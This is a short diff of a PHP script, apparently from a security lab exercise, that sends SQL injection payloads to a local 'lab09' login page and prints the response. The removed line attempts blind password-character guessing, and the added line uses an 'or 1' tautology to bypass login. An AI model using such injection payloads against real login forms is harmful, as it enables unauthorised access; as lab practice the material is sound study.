@@ -1,5 +1,5 @@
 <?php
-$url="http://localhost/lab09/login.php?u=\"%20%27admin%27%20WHERE%20SUBSTRING(%27password%27, 0, 1) = \"a\"--%20";
+$url="http://localhost/lab09/login.php?u=\" or 1 --%20";
 $result = file_get_contents($url);
 
 print($result);
